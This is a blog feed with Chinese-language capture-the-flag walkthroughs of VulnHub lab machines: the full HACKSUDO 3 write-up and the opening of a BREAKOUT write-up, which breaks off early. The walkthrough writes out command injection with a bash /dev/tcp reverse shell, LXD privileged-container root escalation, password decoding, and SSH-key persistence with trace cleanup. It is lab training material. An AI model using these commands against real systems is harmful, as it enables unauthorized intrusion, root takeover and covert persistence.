<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://www.n1h1l157.live</id>
    <title>X_T • Posts by &#34;vulnhub 1-10&#34; tag</title>
    <link href="http://www.n1h1l157.live" />
    <updated>2021-10-31T16:00:00.000Z</updated>
    <category term="ENFJ" />
    <category term="ESFP" />
    <category term="ENTP" />
    <category term="ESFJ" />
    <category term="ENFP" />
    <category term="ENTJ" />
    <category term="ESTJ" />
    <category term="ESTP" />
    <category term="INTJ" />
    <category term="INFJ" />
    <category term="INFP" />
    <category term="INTP" />
    <category term="ISFJ" />
    <category term="ISFP" />
    <category term="ISTP" />
    <category term="ISTJ" />
    <category term="MBTI" />
    <category term="心理测试" />
    <category term="渗透测试" />
    <category term="Linux" />
    <category term="信息安全网址" />
    <category term="Trojan" />
    <category term="VULNHUB 1-10" />
    <category term="VULNHUB 11-20" />
    <category term="VULNHUB 21-30" />
    <category term="VULNHUB 31-40" />
    <category term="VULNHUB 41-50" />
    <category term="生命" />
    <category term="人生" />
    <category term="成长" />
    <category term="意义" />
    <category term="人生哲学" />
    <category term="命运" />
    <category term="神学" />
    <category term="历史" />
    <category term="社会" />
    <category term="人性" />
    <category term="爱情" />
    <category term="道德" />
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/103%20HACKSUDO/</id>
        <title>VULNHUB 3 HACKSUDO</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/103%20HACKSUDO/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja3N1ZG8tMyw2NzEv&#34;&gt;https://www.vulnhub.com/entry/hacksudo-3,671/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 HACKSUDO：桥接于 1 92.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-032.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-033.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.141&lt;/p&gt;
&lt;h3 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p 1-1024 192.168.31.141 - oN /tmp/hacksudo.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-034.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;目录爆破并反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#目录爆破并反弹shell&#34;&gt;#&lt;/a&gt; 目录爆破并反弹 shell&lt;/h3&gt;
&lt;p&gt;打开网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQx&#34;&gt;http://192.168.31.141&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;对此网站进行目录扫描&lt;br&gt;
 &lt;code&gt;dirsearch -u http://192.168.31.141&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-035.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQxL2xvZ2luLnBocA==&#34;&gt;http://192.168.31.141/login.php&lt;/span&gt; 尝试弱口令，万能密码均失败&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;加载比较全面一点的字典，来扩大目录，看是否能得到更多的信息&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gobuster dir -u http://192.168.31.141 -x php,txt,html,bak,zip -w&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-036.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQxL2dlbmVyYXRvci5waHAj&#34;&gt;http://192.168.31.141/generator.php#&lt;/span&gt; 存在 REC 代码执行漏洞&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;对 http://192.168.31.141/generator.php# 网站进行攻击&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;疑似 figlet xx 的命令，构造 figlet xx&amp;amp;ls 可执行更多的 linux 命令&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在此位置输入反弹shell的命令，并监听端口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc lvvp 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1 &amp;amp; bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-037.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使终端窗口变为一个标准的终端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27; - &amp;gt; ctrl+z&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg -&amp;gt; enter,enter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-038.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;凯撒加密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#凯撒加密&#34;&gt;#&lt;/a&gt; 凯撒加密&lt;/h3&gt;
&lt;p&gt;翻阅文件，这里找到一个类似于 “凯撒加密” 的文件&lt;/p&gt;
&lt;p&gt;提示：凯撒密码是一种位移加密方式，只对 26 个字母进行位移替换加密，规则简单。例如，当偏移量是 2 的时候，所有的字母 A 将被替换成 C，B 变成 D，以此类推。如果您输入的是中英文组合，则只会对英文加密解密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-039.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在线进行凯撒解密，偏移为 13 ：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21vZXJzaW1hLjAwY2hhLm5ldC9rYWlzYW1pbWEuYXNw&#34;&gt;http://moersima.00cha.net/kaisamima.asp&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-040.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;解密后的数据为：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hacksudo locker SSH username:hacksudo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;password:63c9142792d571d0f7c28eb30626d6f38792a2e7679b76d784231676d62 447fb80af8953745f709c6622dda2cb4d754c262d0d31b3030a08f7b524079a6b336b&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;sha-512加密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sha-512加密&#34;&gt;#&lt;/a&gt; SHA 512 加密&lt;/h3&gt;
&lt;p&gt;密码又被进行了一层 hash 散列加密&lt;br&gt;
在线 hash 解密：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jcmFja3N0YXRpb24ubmV0Lw==&#34;&gt;https://crackstation.net/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-041.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 得到 hacksudo 的用户名：hacksudo 密码：vishal&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;登陆到此用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;su hacksudo &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-042.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;lxd-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lxd-提权&#34;&gt;#&lt;/a&gt; LXD 提权&lt;/h3&gt;
&lt;p&gt;发现了 id 之后有 lxd 补充组，尝试 lxd 提权&lt;br&gt;
 lxd 提权指南：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L2xpbnV4LXVuaXgvcHJpdmlsZWdlLWVzY2FsYXRpb24vaW50ZXJlc3RpbmctZ3JvdXBzLWxpbnV4LXBlL2x4ZC1wcml2aWxlZ2UtZXNjYWxhdGlvbg==&#34;&gt;https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在kali机器上下载lxd的文件，并通过scp发送至靶机：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https://github.com/saghul/lxd-alpine-builder/archive/refs/heads/master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scp -r parallels@192.168.31.135:~/Desktop/tool/lxd/lxd /tmp/lxd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;自定义镜像&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sed -i &amp;#x27;s,yaml_path=&amp;quot;latest-stable/releases/$apk_arch/latest-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;releases.yaml&amp;quot;,yaml_path=&amp;quot;v3.8/releases/$apk_arch/latest-releases.yaml&amp;quot;,&amp;#x27; build-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alpine&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo ./build-alpine -a i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;引入镜像&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lxc image import alpine*.tar.gz --alias myimage&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lxd init&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lxc init myimage mycontainer -c security.privileged=true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lxc config device add mycontainer mydevice disk source=/ path=/mnt/root&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;recursive=true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lxc start mycontainer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lxc exec mycontainer /bin/sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-044.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;配置ssh-keygen维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置ssh-keygen维权&#34;&gt;#&lt;/a&gt; 配置 ssh-keygen 维权&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;服务器操作&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成私钥和公钥：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -t rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;保存公钥至认证文件：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ~/.ssh/id_rsa.pub &amp;gt;&amp;gt; ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;客户端操作：&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;下载私钥：&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scp hacksudo@192.168.31.141:~/.ssh/id_rsa.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;改变文件权限：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 700 vulnhub_hacksudo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;免密登陆服务器：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh hacksudo@192.168.31.141 -i ~/.ssh/vulnhub_hacksudo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;靶机消除痕迹&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;销毁服务端的痕迹：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rm -f ~/.ssh/id_rsa &amp;amp;&amp;amp; rm -f ~/.ssh/id_rsa.pub&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-045.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 免密登陆 root 失败，但可以免密登陆账户 hacksudo&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;下次登陆此服务器需要&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh hacksudo@192.168.31.141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在hacksudo账户内使用如下命令可直接进入root&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lxc exec mycontainer /bin/sh &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <category term="VULNHUB 1-10" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/104%20BREAKOUT/</id>
        <title>VULNHUB 4 BREAKOUT</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/104%20BREAKOUT/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZW1waXJlLWJyZWFrb3V0LDc1MS8=&#34;&gt;https://www.vulnhub.com/entry/empire-breakout,751/&lt;/span&gt;&lt;br&gt;
 教程链接地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIyLzAyLzIwL3Z1bG5odWItYnJlYWtvdXQv&#34;&gt;https://readysetexploit.wordpress.com/2022/02/20/vulnhub-breakout/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 NAPPING：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-046.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/li&gt;
&lt;/ol&gt;
